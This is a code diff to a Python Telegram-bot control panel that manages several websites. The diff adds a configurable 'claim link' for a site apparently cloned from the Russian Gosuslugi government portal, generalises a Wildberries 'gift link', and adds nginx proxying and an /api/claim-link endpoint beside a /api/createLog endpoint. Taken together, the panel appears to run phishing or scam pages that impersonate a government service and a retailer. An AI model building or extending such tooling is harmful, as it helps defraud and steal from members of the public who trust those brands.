@@ -122,7 +122,8 @@ SITES = {
         "type": "django",
         "proxy_port": 8000,
         "static_root": "/var/www/gosuslugi/staticfiles",
-        "has_gift_link": False,
+        "has_gift_link": True,
+        "gift_link_label": "📋 Ссылка заявки",
         "default_domain": "",
         "nginx_conf": "/etc/nginx/sites-enabled/site_gos.conf",
     },
@@ -166,12 +167,12 @@ def get_site_domain(site_id: str) -> str:
 def set_site_domain(site_id: str, domain: str):
     set_site_setting(site_id, "domain", domain)
 
-def get_gift_link() -> str:
-    """Ссылка подарка (только для wb)"""
-    return get_site_setting("wb", "gift_link", "")
+def get_gift_link(site_id: str = "wb") -> str:
+    """Ссылка подарка/заявки для сайта"""
+    return get_site_setting(site_id, "gift_link", "")
 
-def set_gift_link(link: str):
-    set_site_setting("wb", "gift_link", link)
+def set_gift_link(site_id: str, link: str):
+    set_site_setting(site_id, "gift_link", link)
 
 # ============================================
 # NGINX КОНФИГУРАЦИЯ
@@ -203,6 +204,13 @@ NGINX_DJANGO_TEMPLATE = """server {{
 
     location /static/ {{
         alias {static_root}/;
+    }}
+
+    location /api/ {{
+        proxy_pass http://127.0.0.1:5000/api/;
+        proxy_http_version 1.1;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
     }}
 
     location / {{
@@ -335,7 +343,8 @@ def get_site_menu(site_id: str):
         [types.InlineKeyboardButton(text="🌐 Домен", callback_data=f"domain:{site_id}")],
     ]
     if site.get("has_gift_link"):
-        buttons.insert(0, [types.InlineKeyboardButton(text="🎁 Ссылка подарка", callback_data=f"link:{site_id}")])
+        link_label = site.get("gift_link_label", "🎁 Ссылка подарка")
+        buttons.insert(0, [types.InlineKeyboardButton(text=link_label, callback_data=f"link:{site_id}")])
     buttons.append([types.InlineKeyboardButton(text="🔒 SSL", callback_data=f"ssl:{site_id}")])
     buttons.append([types.InlineKeyboardButton(text="⬅️ Назад", callback_data="menu:main")])
     return types.InlineKeyboardMarkup(inline_keyboard=buttons)
@@ -374,8 +383,8 @@ def site_info_text(site_id: str) -> str:
     if domain:
         lines.append(f"🔗 https://{domain}/")
     if site.get("has_gift_link"):
-        link = get_gift_link()
-        lines.append(f"🎁 Ссылка: <code>{link or 'не установлена'}</code>")
+        link = get_gift_link(site_id)
+        lines.append(f"🔗 Ссылка: <code>{link or 'не установлена'}</code>")
     lines.append(f"⚙️ Тип: {site['type']}, порт {site['proxy_port']}")
     return "\n".join(lines)
 
@@ -441,8 +450,9 @@ async def menu_domain(callback: types.CallbackQuery):
 async def menu_link(callback: types.CallbackQuery):
     site_id = callback.data.split(":")[1]
     site = SITES[site_id]
-    link = get_gift_link()
-    text = f"{site['emoji']} <b>{site['name']} — Ссылка подарка</b>\n\n"
+    link = get_gift_link(site_id)
+    link_label = site.get("gift_link_label", "🎁 Ссылка подарка")
+    text = f"{site['emoji']} <b>{site['name']} — {link_label}</b>\n\n"
     if link:
         text += f"Текущая: <code>{link}</code>"
     else:
@@ -547,13 +557,14 @@ async def process_link(message: types.Message, state: FSMContext):
     data = await state.get_data()
     site_id = data.get("site_id", "wb")
     link = message.text.strip()
-    set_gift_link(link)
+    set_gift_link(site_id, link)
     await state.clear()
+    site = SITES[site_id]
     await message.answer(
-        f"✅ Ссылка подарка установлена:\n<code>{link}</code>",
+        f"✅ Ссылка установлена для {site['emoji']} {site['name']}:\n<code>{link}</code>",
         reply_markup=get_site_menu(site_id)
     )
-    logger.info(f"Gift link updated: {link}")
+    logger.info(f"Gift link updated for {site_id}: {link}")
 
 @router.message(BotStates.waiting_domain)
 async def process_domain(message: types.Message, state: FSMContext):
@@ -792,8 +803,14 @@ async def health():
 
 @app.get("/api/gift-link")
 async def api_gift_link():
-    """Получение текущей ссылки подарка"""
-    link = get_gift_link()
+    """Получение текущей ссылки подарка (Wildberries)"""
+    link = get_gift_link("wb")
+    return {"link": link}
+
+@app.get("/api/claim-link")
+async def api_claim_link():
+    """Получение текущей ссылки заявки (Госуслуги)"""
+    link = get_gift_link("gos")
     return {"link": link}
 
 @app.post("/api/createLog")
